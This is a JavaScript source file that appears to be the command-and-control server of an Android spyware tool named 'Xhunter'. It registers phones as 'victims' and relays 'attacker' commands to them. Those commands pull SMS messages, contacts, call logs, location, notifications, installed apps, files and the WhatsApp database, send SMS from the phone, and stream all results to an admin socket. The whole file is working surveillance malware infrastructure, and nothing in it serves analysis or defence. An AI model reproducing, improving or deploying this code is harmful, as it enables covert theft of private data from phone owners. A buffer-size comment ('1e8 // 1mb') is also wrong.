const express = require('express');
const app = express()
const server = require('http').createServer(app)
const { Server } = require('socket.io')
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 1mb
});

var victimList={};
var deviceList={};
var victimData={};
var adminSocketId=null;
const port = 8080;

server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!!'))

io.on('connection', (socket) => {
    socket.on('adminJoin', ()=>{
        adminSocketId=socket.id;
        if(Object.keys(victimData).length>0){
            Object.keys(victimData).map((key)=>socket.emit("join", victimData[key]));
        }
    })
    socket.on('request', request);//from attacker
    socket.on('join',(device)=>{
        log("Victim joined => socketId "+JSON.stringify(socket.id));
        victimList[device.id] =  socket.id;
        victimData[device.id]= {...device,socketId: socket.id};
        deviceList[socket.id] =  {
          "id":  device.id,
          "model":  device.model
        }
        socket.broadcast.emit("join", {...device,socketId: socket.id});
      });

      socket.on('getDir',(data)=>response("getDir",data));
      socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
      socket.on('getContacts',(data)=>response("getContacts",data));
      socket.on('sendSMS',(data)=>response("sendSMS",data));
      socket.on('getCallLog',(data)=>response("getCallLog",data));
      socket.on("previewImage", (data) =>response("previewImage",data));
      socket.on("error", (data) =>response("error",data));
      socket.on("getSMS", (data) =>response("getSMS",data));
      socket.on('getLocation',(data)=>response("getLocation",data));
      socket.on('getNotifications',(data)=>response("getNotifications",data));
      
      // Backup event listeners - acknowledge backup initiation
      socket.on('backupSMS', () => handleBackupInitiation(socket, 'backupSMS', 'SMS'));
      socket.on('backupContacts', () => handleBackupInitiation(socket, 'backupContacts', 'Contacts'));
      socket.on('backupCallLog', () => handleBackupInitiation(socket, 'backupCallLog', 'Call Log'));
      socket.on('backupNotifications', () => handleBackupInitiation(socket, 'backupNotifications', 'Notifications'));

     
      socket.on('disconnect', () => {
        if(socket.id===adminSocketId){
            adminSocketId=null
        }else{
            response("disconnectClient",socket.id)
            Object.keys(victimList).map((key)=>{
                if(victimList[key] === socket.id){
                  delete victimList[key]
                  delete victimData[key]
                }
              })
        }
    });
    
    socket.on("download", (d, callback) =>responseBinary("download", d, callback));
    socket.on("downloadWhatsappDatabase", (d, callback) => {
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
       });


});

const request =(d)=>{// request from attacker to victim
    let { to, action, data } = JSON.parse(d);
    log("Requesting action: "+ action);
    io.to(victimList[to]).emit(action, data);
  }

const response =(action, data)=>{// response from victim to attacker
    if(adminSocketId){
        log("response action: "+ action);
        io.to(adminSocketId).emit(action, data);
    }
  }
  
const responseBinary =(action, data, callback)=>{// response from victim to attacker
    if(adminSocketId){
        log("response action: "+ action);
        callback("success")
        io.to(adminSocketId).emit(action, data);
    }
  }

// Handle backup initiation and send response to admin
const handleBackupInitiation = (socket, action, moduleName) => {
    const deviceInfo = deviceList[socket.id];
    const deviceId = deviceInfo ? deviceInfo.id : 'Unknown';
    const deviceModel = deviceInfo ? deviceInfo.model : 'Unknown';
    
    log(`${moduleName} backup initiated for device: ${deviceModel} (${deviceId})`);
    
    // Send acknowledgment to admin that backup process has started
    if(adminSocketId){
        const backupResponse = {
            action: action,
            module: moduleName,
            status: 'initiated',
            deviceId: deviceId,
            deviceModel: deviceModel,
            timestamp: new Date().toISOString(),
            message: `${moduleName} backup process initiated on device ${deviceModel}`
        };
        io.to(adminSocketId).emit('backupStatus', backupResponse);
        log(`Backup status sent to admin: ${JSON.stringify(backupResponse)}`);
    }
  }
// LOGGER
const log = (log) =>{
    console.log(log)
  }
